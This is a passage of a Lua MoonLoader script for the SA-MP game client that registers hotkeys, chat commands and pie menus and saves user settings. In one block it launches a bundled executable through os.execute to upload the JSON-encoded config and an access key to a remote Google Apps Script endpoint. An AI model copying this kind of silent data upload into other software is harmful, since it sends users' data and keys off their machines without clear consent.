							rkeys.registerHotKey(makeHotKey(3), true, hk_3)
							rkeys.registerHotKey(makeHotKey(4), true, hk_4)
							rkeys.registerHotKey(makeHotKey(5), true, hk_5)
							rkeys.registerHotKey(makeHotKey(6), true, hk_6)
							rkeys.registerHotKey(makeHotKey(7), true, hk_7)
							rkeys.registerHotKey(makeHotKey(8), true, hk_8)
							rkeys.registerHotKey(makeHotKey(9), true, hk_9)
							rkeys.registerHotKey(makeHotKey(10), true, hk_10)
							rkeys.registerHotKey(makeHotKey(11), true, hk_11)
							rkeys.registerHotKey(makeHotKey(12), true, hk_12)
						--rkeys.registerHotKey(makeHotKey(14), true, hk_14)
							--rkeys.registerHotKey(makeHotKey(15), true, hk_15)
							--rkeys.registerHotKey(makeHotKey(16), true, hk_16)
							--rkeys.registerHotKey(makeHotKey(17), true, hk_17)
							--rkeys.registerHotKey(makeHotKey(18), true, hk_18)
							rkeys.registerHotKey(makeHotKey(19), true, hk_19)
							rkeys.registerHotKey(makeHotKey(20), true, hk_20)
							rkeys.registerHotKey(makeHotKey(21), true, hk_21)
							rkeys.registerHotKey(makeHotKey(22), true, hk_22)
							rkeys.registerHotKey(makeHotKey(23), true, hk_23)
							--rkeys.registerHotKey(makeHotKey(24), true, hk_24)
							rkeys.registerHotKey(makeHotKey(25), true, hk_25)
							rkeys.registerHotKey(makeHotKey(26), true, hk_26)
							rkeys.registerHotKey(makeHotKey(27), true, hk_27)
							rkeys.registerHotKey(makeHotKey(28), true, hk_28)
							rkeys.registerHotKey(makeHotKey(29), true, hk_29)
							rkeys.registerHotKey(makeHotKey(30), true, hk_30)
							rkeys.registerHotKey(makeHotKey(31), true, hk_31)
							rkeys.registerHotKey(makeHotKey(32), true, hk_32)
							rkeys.registerHotKey(makeHotKey(33), true, hk_33)
							rkeys.registerHotKey(makeHotKey(34), true, hk_34)
							rkeys.registerHotKey(makeHotKey(35), true, hk_35)
							rkeys.registerHotKey(makeHotKey(36), true, hk_36)
							rkeys.registerHotKey(makeHotKey(37), true, hk_37)
							rkeys.registerHotKey(makeHotKey(38), true, hk_38)
							rkeys.registerHotKey(makeHotKey(39), true, hk_39)
							rkeys.registerHotKey(makeHotKey(40), true, hk_40)
							rkeys.registerHotKey(makeHotKey(41), true, hk_41)
							rkeys.registerHotKey(makeHotKey(42), true, hk_42)
							rkeys.registerHotKey(makeHotKey(43), true, hk_43)

							if config_ini.bools[60] then
								rkeys.registerHotKey(makeHotKey(45), true, hk_45)
								rkeys.registerHotKey(makeHotKey(46), true, hk_46)
								rkeys.registerHotKey(makeHotKey(47), true, hk_47)
								rkeys.registerHotKey(makeHotKey(48), true, hk_48)
								rkeys.registerHotKey(makeHotKey(49), true, hk_49)
								rkeys.registerHotKey(makeHotKey(50), true, hk_50)
								rkeys.registerHotKey(makeHotKey(51), true, hk_51)
							end

							sampRegisterChatCommand(config_ini.Commands[1], cmd_ob)
							sampRegisterChatCommand(config_ini.Commands[2], cmd_sopr)
							sampRegisterChatCommand(config_ini.Commands[3], cmd_zgruz)
							sampRegisterChatCommand(config_ini.Commands[4], cmd_rgruz)
							sampRegisterChatCommand(config_ini.Commands[5], cmd_bgruz)
							sampRegisterChatCommand(config_ini.Commands[6], cmd_kv)
							sampRegisterChatCommand(config_ini.Commands[7], cmd_e)
							--sampRegisterChatCommand(config_ini.Commands[8], cmd_que)
							sampRegisterChatCommand(config_ini.Commands[9], cmd_r)
							sampRegisterChatCommand(config_ini.Commands[10], cmd_pr)
							sampRegisterChatCommand(config_ini.Commands[11], hk_5)
							sampRegisterChatCommand(config_ini.Commands[12], cmd_gr)
							sampRegisterChatCommand(config_ini.Commands[13], cmd_hit)
							sampRegisterChatCommand(config_ini.Commands[14], cmd_cl)
							sampRegisterChatCommand(config_ini.Commands[15], hk_11)
							sampRegisterChatCommand(config_ini.Commands[16], cmd_memb)
							sampRegisterChatCommand(config_ini.Commands[17], cmd_chs)
							sampRegisterChatCommand(config_ini.Commands[18], cmd_mp)
							sampRegisterChatCommand(config_ini.Commands[19], cmd_z)
							sampRegisterChatCommand(config_ini.Commands[20], cmd_mem1)
							sampRegisterChatCommand(config_ini.Commands[21], cmd_sw)
							sampRegisterChatCommand(config_ini.Commands[22], cmd_st)
							--sampRegisterChatCommand(config_ini.Commands[23], cmd_stroy)
						--	sampRegisterChatCommand(config_ini.Commands[24], cmd_altenter)
							sampRegisterChatCommand(config_ini.Commands[25], cmd_afk)
						--	sampRegisterChatCommand(config_ini.Commands[26], cmd_destroy)
							sampRegisterChatCommand(config_ini.Commands[27], cmd_mcall)
							sampRegisterChatCommand(config_ini.Commands[28], cmd_showp)
							--sampRegisterChatCommand(config_ini.Commands[29], cmd_priziv)

							sampRegisterChatCommand(config_ini.UserCBinderC[1], cmd_u1)
							sampRegisterChatCommand(config_ini.UserCBinderC[2], cmd_u2)
							sampRegisterChatCommand(config_ini.UserCBinderC[3], cmd_u3)
							sampRegisterChatCommand(config_ini.UserCBinderC[4], cmd_u4)
							sampRegisterChatCommand(config_ini.UserCBinderC[5], cmd_u5)
							sampRegisterChatCommand(config_ini.UserCBinderC[6], cmd_u6)
							sampRegisterChatCommand(config_ini.UserCBinderC[7], cmd_u7)
							sampRegisterChatCommand(config_ini.UserCBinderC[8], cmd_u8)
							sampRegisterChatCommand(config_ini.UserCBinderC[9], cmd_u9)
							sampRegisterChatCommand(config_ini.UserCBinderC[10], cmd_u10)
							sampRegisterChatCommand(config_ini.UserCBinderC[11], cmd_u11)
							sampRegisterChatCommand(config_ini.UserCBinderC[12], cmd_u12)
							sampRegisterChatCommand(config_ini.UserCBinderC[13], cmd_u13)
							sampRegisterChatCommand(config_ini.UserCBinderC[14], cmd_u14)
							sampRegisterChatCommand(config_ini.UserCBinderC[15], cmd_u15)
							sampRegisterChatCommand(config_ini.UserCBinderC[16], cmd_u16)
							sampRegisterChatCommand(config_ini.UserCBinderC[17], cmd_u17)
							sampRegisterChatCommand(config_ini.UserCBinderC[18], cmd_u18)

							sampRegisterChatCommand("commandhelp", cmd_commandhelp)
							sampRegisterChatCommand("bugreport", cmd_bugreport)
							sampRegisterChatCommand("mkv", cmd_mkv)
							sampRegisterChatCommand("bkv", cmd_bkv)
							sampRegisterChatCommand("lej", cmd_lej)
							sampRegisterChatCommand("bp", cmd_bp)
							sampRegisterChatCommand("cars", cmd_cars)
							sampRegisterChatCommand("scr", cmd_scr)
							sampRegisterChatCommand("piss", cmd_piss)
							sampRegisterChatCommand("iznas", cmd_iznas)
							sampRegisterChatCommand("dclean", cmd_dclean)
							sampRegisterChatCommand("toggle", cmd_toggle)
							sampRegisterChatCommand("duel", cmd_duel)
							sampRegisterChatCommand("mon", cmd_mon)
							sampRegisterChatCommand("get", cmd_get)

							if access.alevel > -1 then
									sampRegisterChatCommand("balogin", cmd_balogin)
							end

							if access.alevel > 0 then
									sampRegisterChatCommand("lek", cmd_lek)
									sampRegisterChatCommand("pcheck", cmd_pcheck)
									sampRegisterChatCommand("tren", cmd_tren)
							end

							if access.alevel > 1 then
									sampRegisterChatCommand("padd", cmd_padd)
									sampRegisterChatCommand("pdel", cmd_pdel)
									sampRegisterChatCommand("mark", cmd_mark)
									sampRegisterChatCommand("add", cmd_add)
									sampRegisterChatCommand("del", cmd_del)
									sampRegisterChatCommand("change", cmd_change)
							end

							if access.alevel > 2 then
									sampRegisterChatCommand("otm", cmd_otm)	
							end

							if access.alevel == 3 or access.alevel == 6 then sampRegisterChatCommand("fond", cmd_fond) end

							if access.alevel > 4 then
								sampRegisterChatCommand("moder", cmd_moder)
								sampRegisterChatCommand("reg", cmd_reg)
								sampRegisterChatCommand("ban", cmd_ban)
							end
							
							piearr.action = 0
							piearr.pie_mode.v = false -- ����� PieMenu
							piearr.pie_keyid = makeHotKey(44)[1]
							piearr.pie_elements =	{}

							if config_ini.UserPieMenuNames[1] ~= "" then table.insert(piearr.pie_elements, {name = config_ini.UserPieMenuNames[1], action = function() piearr.action = 1 end, next = nil}) end
							if config_ini.UserPieMenuNames[2] ~= "" then table.insert(piearr.pie_elements, {name = config_ini.UserPieMenuNames[2], action = function() piearr.action = 2 end, next = nil}) end
							if config_ini.UserPieMenuNames[3] ~= "" then table.insert(piearr.pie_elements, {name = config_ini.UserPieMenuNames[3], action = function() piearr.action = 3 end, next = nil}) end
							if config_ini.UserPieMenuNames[4] ~= "" then table.insert(piearr.pie_elements, {name = config_ini.UserPieMenuNames[4], action = function() piearr.action = 4 end, next = nil}) end
							if config_ini.UserPieMenuNames[5] ~= "" then table.insert(piearr.pie_elements, {name = config_ini.UserPieMenuNames[5], action = function() piearr.action = 5 end, next = nil}) end
							if config_ini.UserPieMenuNames[6] ~= "" then table.insert(piearr.pie_elements, {name = config_ini.UserPieMenuNames[6], action = function() piearr.action = 6 end, next = nil}) end
							if config_ini.UserPieMenuNames[7] ~= "" then table.insert(piearr.pie_elements, {name = config_ini.UserPieMenuNames[7], action = function() piearr.action = 7 end, next = nil}) end
							if config_ini.UserPieMenuNames[8] ~= "" then table.insert(piearr.pie_elements, {name = config_ini.UserPieMenuNames[8], action = function() piearr.action = 8 end, next = nil}) end
							if config_ini.UserPieMenuNames[9] ~= "" then table.insert(piearr.pie_elements, {name = config_ini.UserPieMenuNames[9], action = function() piearr.action = 9 end, next = nil}) end
							if config_ini.UserPieMenuNames[10] ~= "" then table.insert(piearr.pie_elements, {name = config_ini.UserPieMenuNames[10], action = function() piearr.action = 10 end, next = nil}) end
							
							piearr.weap.action = 0
							piearr.weap.pie_mode.v = false -- ����� PieMenu
							piearr.weap.pie_keyid = makeHotKey(52)[1]
							piearr.weap.pie_elements =	{}

							table.insert(piearr.weap.pie_elements, {name = "First", action = function() piearr.weap.action = 1 end, next = nil})
							table.insert(piearr.weap.pie_elements, {name = "Desert Eagle", action = function() piearr.weap.action = 2 end, next = nil})
							table.insert(piearr.weap.pie_elements, {name = "Shotgun", action = function() piearr.weap.action = 3 end, next = nil})
							table.insert(piearr.weap.pie_elements, {name = "SMG", action = function() piearr.weap.action = 4 end, next = nil})
							table.insert(piearr.weap.pie_elements, {name = "M4A1", action = function() piearr.weap.action = 5 end, next = nil})
							table.insert(piearr.weap.pie_elements, {name = "Rifle", action = function() piearr.weap.action = 6 end, next = nil})
							table.insert(piearr.weap.pie_elements, {name = "Parachute", action = function() piearr.weap.action = 7 end, next = nil})
							
							-- for k, v in pairs(config_ini.UserPieMenuNames) do
							-- 		print(pie_index)
							-- 		if pie_index == 11 then break end
							-- 		if v ~= "" then
							-- 				table.insert(piearr.pie_elements, {name = v, action = function() piearr.action = pie_index end, next = nil})
							-- 				pie_index = pie_index + 1
							-- 		end
							-- end
							suspendkeys = 0
					end

					if not guis.mainw.v and not SetMode and not piearr.pie_mode.v and not piearr.weap.pie_mode.v then imgui.ShowCursor = false imgui.LockPlayer = false if suspendkeys == 1 then suspendkeys = 2 sampSetChatDisplayMode(3) end end

					if needtosave then
							needtosave = false
							lua_thread.create(
									function()
											config_ini.UserClist[1] = tostring(u8:decode(guibuffers.clistparams.clist1.v))
											config_ini.UserClist[2] = tostring(u8:decode(guibuffers.clistparams.clist2.v))
											config_ini.UserClist[3] = tostring(u8:decode(guibuffers.clistparams.clist3.v))
											config_ini.UserClist[4] = tostring(u8:decode(guibuffers.clistparams.clist4.v))
											config_ini.UserClist[5] = tostring(u8:decode(guibuffers.clistparams.clist5.v))
											config_ini.UserClist[6] = tostring(u8:decode(guibuffers.clistparams.clist6.v))
											config_ini.UserClist[7] = tostring(u8:decode(guibuffers.clistparams.clist7.v))
											config_ini.UserClist[8] = tostring(u8:decode(guibuffers.clistparams.clist8.v))
											config_ini.UserClist[9] = tostring(u8:decode(guibuffers.clistparams.clist9.v))
											config_ini.UserClist[10] = tostring(u8:decode(guibuffers.clistparams.clist10.v))
											config_ini.UserClist[11] = tostring(u8:decode(guibuffers.clistparams.clist11.v))
											config_ini.UserClist[13] = tostring(u8:decode(guibuffers.clistparams.clist13.v))
											config_ini.UserClist[14] = tostring(u8:decode(guibuffers.clistparams.clist14.v))
											config_ini.UserClist[15] = tostring(u8:decode(guibuffers.clistparams.clist15.v))
											config_ini.UserClist[16] = tostring(u8:decode(guibuffers.clistparams.clist16.v))
											config_ini.UserClist[17] = tostring(u8:decode(guibuffers.clistparams.clist17.v))
											config_ini.UserClist[18] = tostring(u8:decode(guibuffers.clistparams.clist18.v))
											config_ini.UserClist[19] = tostring(u8:decode(guibuffers.clistparams.clist19.v))
											config_ini.UserClist[20] = tostring(u8:decode(guibuffers.clistparams.clist20.v))
											config_ini.UserClist[21] = tostring(u8:decode(guibuffers.clistparams.clist21.v))
											config_ini.UserClist[22] = tostring(u8:decode(guibuffers.clistparams.clist22.v))
											config_ini.UserClist[23] = tostring(u8:decode(guibuffers.clistparams.clist23.v))
											config_ini.UserClist[24] = tostring(u8:decode(guibuffers.clistparams.clist24.v))
											config_ini.UserClist[25] = tostring(u8:decode(guibuffers.clistparams.clist25.v))
											config_ini.UserClist[26] = tostring(u8:decode(guibuffers.clistparams.clist26.v))
											config_ini.UserClist[27] = tostring(u8:decode(guibuffers.clistparams.clist27.v))
											config_ini.UserClist[28] = tostring(u8:decode(guibuffers.clistparams.clist28.v))
											config_ini.UserClist[29] = tostring(u8:decode(guibuffers.clistparams.clist29.v))
											config_ini.UserClist[30] = tostring(u8:decode(guibuffers.clistparams.clist30.v))
											config_ini.UserClist[31] = tostring(u8:decode(guibuffers.clistparams.clist31.v))
											config_ini.UserClist[32] = tostring(u8:decode(guibuffers.clistparams.clist32.v))
											config_ini.UserClist[33] = tostring(u8:decode(guibuffers.clistparams.clist33.v))
											
											config_ini.UserGun[1] = tostring(u8:decode(guibuffers.gunparams.gun1.v))
											config_ini.UserGun[2] = tostring(u8:decode(guibuffers.gunparams.gun2.v))
											config_ini.UserGun[3] = tostring(u8:decode(guibuffers.gunparams.gun3.v))
											config_ini.UserGun[4] = tostring(u8:decode(guibuffers.gunparams.gun4.v))
											config_ini.UserGun[5] = tostring(u8:decode(guibuffers.gunparams.gun5.v))
											config_ini.UserGun[6] = tostring(u8:decode(guibuffers.gunparams.gun6.v))
											config_ini.UserGun[7] = tostring(u8:decode(guibuffers.gunparams.gun7.v))

											config_ini.UserBinder[1] = tostring(u8:decode(guibuffers.ubinds.bind1.v))
											config_ini.UserBinder[2] = tostring(u8:decode(guibuffers.ubinds.bind2.v))
											config_ini.UserBinder[3] = tostring(u8:decode(guibuffers.ubinds.bind3.v))
											config_ini.UserBinder[4] = tostring(u8:decode(guibuffers.ubinds.bind4.v))
											config_ini.UserBinder[5] = tostring(u8:decode(guibuffers.ubinds.bind5.v))
											config_ini.UserBinder[6] = tostring(u8:decode(guibuffers.ubinds.bind6.v))
											config_ini.UserBinder[7] = tostring(u8:decode(guibuffers.ubinds.bind7.v))
											config_ini.UserBinder[8] = tostring(u8:decode(guibuffers.ubinds.bind8.v))
											config_ini.UserBinder[9] = tostring(u8:decode(guibuffers.ubinds.bind9.v))
											config_ini.UserBinder[10] = tostring(u8:decode(guibuffers.ubinds.bind10.v))
											config_ini.UserBinder[11] = tostring(u8:decode(guibuffers.ubinds.bind11.v))

											config_ini.UserCBinder[1] = tostring(u8:decode(guibuffers.ucbinds.bind1.v))
											config_ini.UserCBinder[2] = tostring(u8:decode(guibuffers.ucbinds.bind2.v))
											config_ini.UserCBinder[3] = tostring(u8:decode(guibuffers.ucbinds.bind3.v))
											config_ini.UserCBinder[4] = tostring(u8:decode(guibuffers.ucbinds.bind4.v))
											config_ini.UserCBinder[5] = tostring(u8:decode(guibuffers.ucbinds.bind5.v))
											config_ini.UserCBinder[6] = tostring(u8:decode(guibuffers.ucbinds.bind6.v))
											config_ini.UserCBinder[7] = tostring(u8:decode(guibuffers.ucbinds.bind7.v))
											config_ini.UserCBinder[8] = tostring(u8:decode(guibuffers.ucbinds.bind8.v))
											config_ini.UserCBinder[9] = tostring(u8:decode(guibuffers.ucbinds.bind9.v))
											config_ini.UserCBinder[10] = tostring(u8:decode(guibuffers.ucbinds.bind10.v))
											config_ini.UserCBinder[11] = tostring(u8:decode(guibuffers.ucbinds.bind11.v))
											config_ini.UserCBinder[12] = tostring(u8:decode(guibuffers.ucbinds.bind12.v))
											config_ini.UserCBinder[13] = tostring(u8:decode(guibuffers.ucbinds.bind13.v))
											config_ini.UserCBinder[14] = tostring(u8:decode(guibuffers.ucbinds.bind14.v))

											config_ini.UserCBinderC[1] = tostring(u8:decode(guibuffers.ucbindsc.bind1.v))
											config_ini.UserCBinderC[2] = tostring(u8:decode(guibuffers.ucbindsc.bind2.v))
											config_ini.UserCBinderC[3] = tostring(u8:decode(guibuffers.ucbindsc.bind3.v))
											config_ini.UserCBinderC[4] = tostring(u8:decode(guibuffers.ucbindsc.bind4.v))
											config_ini.UserCBinderC[5] = tostring(u8:decode(guibuffers.ucbindsc.bind5.v))
											config_ini.UserCBinderC[6] = tostring(u8:decode(guibuffers.ucbindsc.bind6.v))
											config_ini.UserCBinderC[7] = tostring(u8:decode(guibuffers.ucbindsc.bind7.v))
											config_ini.UserCBinderC[8] = tostring(u8:decode(guibuffers.ucbindsc.bind8.v))
											config_ini.UserCBinderC[9] = tostring(u8:decode(guibuffers.ucbindsc.bind9.v))
											config_ini.UserCBinderC[10] = tostring(u8:decode(guibuffers.ucbindsc.bind10.v))
											config_ini.UserCBinderC[11] = tostring(u8:decode(guibuffers.ucbindsc.bind11.v))
											config_ini.UserCBinderC[12] = tostring(u8:decode(guibuffers.ucbindsc.bind12.v))
											config_ini.UserCBinderC[13] = tostring(u8:decode(guibuffers.ucbindsc.bind13.v))
											config_ini.UserCBinderC[14] = tostring(u8:decode(guibuffers.ucbindsc.bind14.v))

											config_ini.rphr[1] = tostring(u8:decode(guibuffers.rphr.bind1.v))
											config_ini.rphr[2] = tostring(u8:decode(guibuffers.rphr.bind2.v))
											config_ini.rphr[3] = tostring(u8:decode(guibuffers.rphr.bind3.v))
											config_ini.rphr[4] = tostring(u8:decode(guibuffers.rphr.bind4.v))
											config_ini.rphr[5] = tostring(u8:decode(guibuffers.rphr.bind5.v))
											config_ini.rphr[6] = tostring(u8:decode(guibuffers.rphr.bind6.v))
											config_ini.rphr[7] = tostring(u8:decode(guibuffers.rphr.bind7.v))
											config_ini.rphr[8] = tostring(u8:decode(guibuffers.rphr.bind8.v))
											config_ini.rphr[9] = tostring(u8:decode(guibuffers.rphr.bind9.v))
											config_ini.rphr[10] = tostring(u8:decode(guibuffers.rphr.bind10.v))

											config_ini.Commands[1] = tostring(u8:decode(guibuffers.commands.command1.v))
											config_ini.Commands[2] = tostring(u8:decode(guibuffers.commands.command2.v))
											config_ini.Commands[3] = tostring(u8:decode(guibuffers.commands.command3.v))
											config_ini.Commands[4] = tostring(u8:decode(guibuffers.commands.command4.v))
											config_ini.Commands[5] = tostring(u8:decode(guibuffers.commands.command5.v))
											config_ini.Commands[6] = tostring(u8:decode(guibuffers.commands.command6.v))
											config_ini.Commands[7] = tostring(u8:decode(guibuffers.commands.command7.v))
											--config_ini.Commands[8] = tostring(u8:decode(guibuffers.commands.command8.v))
											config_ini.Commands[9] = tostring(u8:decode(guibuffers.commands.command9.v))
											config_ini.Commands[10] = tostring(u8:decode(guibuffers.commands.command10.v))
											config_ini.Commands[11] = tostring(u8:decode(guibuffers.commands.command11.v))
											config_ini.Commands[12] = tostring(u8:decode(guibuffers.commands.command12.v))
											config_ini.Commands[13] = tostring(u8:decode(guibuffers.commands.command13.v))
											config_ini.Commands[14] = tostring(u8:decode(guibuffers.commands.command14.v))
											config_ini.Commands[15] = tostring(u8:decode(guibuffers.commands.command15.v))
											config_ini.Commands[16] = tostring(u8:decode(guibuffers.commands.command16.v))
											config_ini.Commands[17] = tostring(u8:decode(guibuffers.commands.command17.v))
											config_ini.Commands[18] = tostring(u8:decode(guibuffers.commands.command18.v))
											config_ini.Commands[19] = tostring(u8:decode(guibuffers.commands.command19.v))
											config_ini.Commands[20] = tostring(u8:decode(guibuffers.commands.command20.v))
											config_ini.Commands[21] = tostring(u8:decode(guibuffers.commands.command21.v))
											config_ini.Commands[22] = tostring(u8:decode(guibuffers.commands.command22.v))
											--config_ini.Commands[23] = tostring(u8:decode(guibuffers.commands.command23.v))
											--config_ini.Commands[24] = tostring(u8:decode(guibuffers.commands.command24.v))
											config_ini.Commands[25] = tostring(u8:decode(guibuffers.commands.command25.v))
											--config_ini.Commands[26] = tostring(u8:decode(guibuffers.commands.command26.v))
											config_ini.Commands[27] = tostring(u8:decode(guibuffers.commands.command27.v))
											config_ini.Commands[28] = tostring(u8:decode(guibuffers.commands.command28.v))
											--config_ini.Commands[29] = tostring(u8:decode(guibuffers.commands.command29.v))

											config_ini.Settings.PlayerFirstName = tostring(u8:decode(guibuffers.settings.fname.v))
											config_ini.Settings.PlayerSecondName = tostring(u8:decode(guibuffers.settings.sname.v))
											config_ini.Settings.PlayerRank = tostring(u8:decode(guibuffers.settings.rank.v))
											config_ini.Settings.timep = tostring(u8:decode(guibuffers.settings.timep.v))
											config_ini.Settings.PlayerU = tostring(u8:decode(guibuffers.settings.PlayerU.v))
											config_ini.Settings.useclist = tostring(u8:decode(guibuffers.settings.useclist.v))
											config_ini.Settings.tag = tostring(u8:decode(guibuffers.settings.tag.v))										
											PlayerU = config_ini.Settings.PlayerU
											useclist = config_ini.Settings.useclist
											tag = config_ini.Settings.tag

											config_ini.warnings[1] = tostring(u8:decode(guibuffers.warnings.war1.v))
											config_ini.warnings[2] = tostring(u8:decode(guibuffers.warnings.war2.v))
											config_ini.warnings[3] = tostring(u8:decode(guibuffers.warnings.war3.v))
											config_ini.warnings[4] = tostring(u8:decode(guibuffers.warnings.war4.v))

											config_ini.UserPieMenuNames[1] = tostring(u8:decode(guibuffers.UserPieMenu.names.name1.v))
											config_ini.UserPieMenuNames[2] = tostring(u8:decode(guibuffers.UserPieMenu.names.name2.v))
											config_ini.UserPieMenuNames[3] = tostring(u8:decode(guibuffers.UserPieMenu.names.name3.v))
											config_ini.UserPieMenuNames[4] = tostring(u8:decode(guibuffers.UserPieMenu.names.name4.v))
											config_ini.UserPieMenuNames[5] = tostring(u8:decode(guibuffers.UserPieMenu.names.name5.v))
											config_ini.UserPieMenuNames[6] = tostring(u8:decode(guibuffers.UserPieMenu.names.name6.v))
											config_ini.UserPieMenuNames[7] = tostring(u8:decode(guibuffers.UserPieMenu.names.name7.v))
											config_ini.UserPieMenuNames[8] = tostring(u8:decode(guibuffers.UserPieMenu.names.name8.v))
											config_ini.UserPieMenuNames[9] = tostring(u8:decode(guibuffers.UserPieMenu.names.name9.v))
											config_ini.UserPieMenuNames[10] = tostring(u8:decode(guibuffers.UserPieMenu.names.name10.v))

											config_ini.UserPieMenuActions[1] = tostring(u8:decode(guibuffers.UserPieMenu.actions.action1.v))
											config_ini.UserPieMenuActions[2] = tostring(u8:decode(guibuffers.UserPieMenu.actions.action2.v))
											config_ini.UserPieMenuActions[3] = tostring(u8:decode(guibuffers.UserPieMenu.actions.action3.v))
											config_ini.UserPieMenuActions[4] = tostring(u8:decode(guibuffers.UserPieMenu.actions.action4.v))
											config_ini.UserPieMenuActions[5] = tostring(u8:decode(guibuffers.UserPieMenu.actions.action5.v))
											config_ini.UserPieMenuActions[6] = tostring(u8:decode(guibuffers.UserPieMenu.actions.action6.v))
											config_ini.UserPieMenuActions[7] = tostring(u8:decode(guibuffers.UserPieMenu.actions.action7.v))
											config_ini.UserPieMenuActions[8] = tostring(u8:decode(guibuffers.UserPieMenu.actions.action8.v))
											config_ini.UserPieMenuActions[9] = tostring(u8:decode(guibuffers.UserPieMenu.actions.action9.v))
											config_ini.UserPieMenuActions[10] = tostring(u8:decode(guibuffers.UserPieMenu.actions.action10.v))
											
											config_ini.plus500[1] = tostring(u8:decode(guibuffers.plus500.plus500color.v))
											config_ini.plus500[2] = tostring(u8:decode(guibuffers.plus500.plus500size.v))
											config_ini.plus500[3] = tostring(u8:decode(guibuffers.plus500.plus500font.v))
											
											config_ini.squadset[1] = tostring(u8:decode(guibuffers.squad.fscolor.v))
											config_ini.squadset[2] = tostring(u8:decode(guibuffers.squad.size.v))
											config_ini.squadset[3] = tostring(u8:decode(guibuffers.squad.font.v))

											config_ini.fondset[1] = tostring(u8:decode(guibuffers.fond.fondcolor.v))
											config_ini.fondset[2] = tostring(u8:decode(guibuffers.fond.mycolor.v))

											config_ini.dial[1] = tostring(u8:decode(guibuffers.dial.med.v))
											config_ini.dial[2] = tostring(u8:decode(guibuffers.dial.rem.v))
											config_ini.dial[3] = tostring(u8:decode(guibuffers.dial.meh.v))
											config_ini.dial[4] = tostring(u8:decode(guibuffers.dial.azs.v))
											
											inicfg.save(config_ini, "config")
											
											if needtosyns then
												needtosyns = false
												sampAddChatMessage("{ff0000}[LUA]: {FFFAFA}��������� ���� ������� ���������", 0xFFFF0000)
												local u = access.saccess and "AKfycbwBG17iJ1Jpy5Ft9lmACSIZyrOA7QBydzgM1S12jkARF7ddEWA" or "AKfycbwURDW5ngl2NOV52zplnjpmKKnhs8pBMUp0A_HZnnYbRXYA4yrH"

												
												local url = 'https://script.google.com/macros/s/' .. u .. '/exec?do=sets&key=' .. access.key .. '&state=' .. access.state .. '&config=123'
												local body = encodeJson(config_ini)
												
												os.remove("Moonloader\\POST_url.txt")
												os.remove("Moonloader\\POST_body.txt")
												os.remove("Moonloader\\POST_response.txt")
												os.remove("Moonloader\\run.bat")

												local url_log = "" .. getWorkingDirectory() .. "\\POST_url.txt"
												local urltext = io.open(url_log, "a")
												urltext:write(url)
												urltext:close()

												local body_log = "" .. getWorkingDirectory() .. "\\POST_body.txt"
												local bodytext = io.open(body_log, "a")
												bodytext:write(body)
												bodytext:close()

												--[[ local bat = "" .. getWorkingDirectory() .. "\\run.bat"
												local bb = io.open(bat, "a")
												bb:write('start "" "' .. thisScript().directory .. '\\POST_req.exe"')
												bb:close() ]]

												local c = 'start "" "' .. thisScript().directory .. '\\POST_req.exe"'
												os.execute(c)
												waitforsave = true
											end
										end
							)
					end

					if needtoreset then
							os.remove("Moonloader\\config\\config.ini")
							sampAddChatMessage("{ff0000}[LUA]: {FFFAFA}��������� ���� ������� ��������. ������� ����������...", 0xFFFF0000)
							needtoreset = false
							wait(0)
							thisScript():reload()
					end
					
					if config_ini.bools[35] == 1 and memb_ini ~= nil then
						for i = 0, 1000 do 
							if sampIsPlayerConnected(i) and memb_ini.players[sampGetPlayerNickname(i)] ~= nil then
								if not sampIs3dTextDefined(2048 - i) then
									local color = 0xffFFFAFA
									--if (memb_ini.players[sampGetPlayerNickname(i)] == "�����" or memb_ini.players[sampGetPlayerNickname(i)] == "������������" or memb_ini.players[sampGetPlayerNickname(i)] == "���������" or memb_ini.players[sampGetPlayerNickname(i)] == "�������") then print("tut") color = 0x0000BFFF end
									sampCreate3dTextEx(2048 - i, memb_ini.players[sampGetPlayerNickname(i)], color, 0, 0, 0.4, 22, false, i, -1)
								end
							end
						end
					end
					
					if needtohold and not sampIsChatInputActive() and not sampIsDialogActive(-1) and not isSampfuncsConsoleActive() and (wasKeyPressed(vkeys.VK_W) or wasKeyPressed(vkeys.VK_S)) then needtohold = false end

					-- ��������� ������� �� ������� (�� ��� ��� �������� ����� ������ ����� �����)
					if time then setTimeOfDay(time, 0) end

					if SetMode then
							if isKeyDown(vkeys.VK_MBUTTON) then
									wait(300)
									if isKeyDown(vkeys.VK_MBUTTON) then
											config_ini.ovCoords.show_timeX, config_ini.ovCoords.show_timeY = 10, 10
											config_ini.ovCoords.show_placeX, config_ini.ovCoords.show_placeY = 10, 10
											config_ini.ovCoords.show_nameX, config_ini.ovCoords.show_nameY = 10, 10
											if isCharInAnyCar(PLAYER_PED) then config_ini.ovCoords.show_vehX, config_ini.ovCoords.show_vehY = 10, 10 end
											config_ini.ovCoords.show_hpX, config_ini.ovCoords.show_hpY = 10, 10
											config_ini.ovCoords.crosCarX, config_ini.ovCoords.crosCarY = 10, 10
											config_ini.ovCoords.show_targetImageX, config_ini.ovCoords.show_targetImageY = 10, 10
											config_ini.ovCoords.show_rkX, config_ini.show_rkY = 10, 10
											config_ini.ovCoords.show_afkX, config_ini.show_afkY = 10, 10
											config_ini.ovCoords.show_tecinfoX, config_ini.show_tecinfoY = 10, 10
											config_ini.ovCoords.show_squadX, config_ini.ovCoords.show_squadY = 10, 10
											config_ini.ovCoords.show_500X, config_ini.ovCoords.show_500Y = 10, 10
											config_ini.ovCoords.show_dindX, config_ini.ovCoords.show_dindY = 10, 10
											config_ini.ovCoords.show_moneyX, config_ini.ovCoords.show_moneyY = 10, 10
											SetMode, SetModeFirstShow = true, true
											sampAddChatMessage("{ff0000}[LUA]: {FFFAFA}���������� ��������� ���� ������� ��������", 0xFFFF0000)
									end
							end
					end

					-- ���������� � ��������������
					if config_ini.bools[57] == 1 then local weapid = tonumber(getCurrentCharWeapon(PLAYER_PED)) if autopred.current_weapon ~= weapid then autopred.current_weapon = weapid autopred.firstshot = false end end
						-- ��������� Pie Menu
					if isKeyDown(makeHotKey(44)[1]) and piearr.action == 0 and not sampIsChatInputActive() and not sampIsDialogActive(-1) and not isSampfuncsConsoleActive() then 
						wait(0) 
						piearr.pie_mode.v = true 
						imgui.ShowCursor = true 
					elseif isKeyDown(makeHotKey(52)[1]) and piearr.weap.action == 0 and not sampIsChatInputActive() and not sampIsDialogActive(-1) and not isSampfuncsConsoleActive() then
						wait(0)
						piearr.weap.pie_mode.v = true 
						imgui.ShowCursor = true 
					else 
						wait(0) 
						piearr.pie_mode.v = false 
						piearr.weap.pie_mode.v = false 
						imgui.ShowCursor = false 
					end

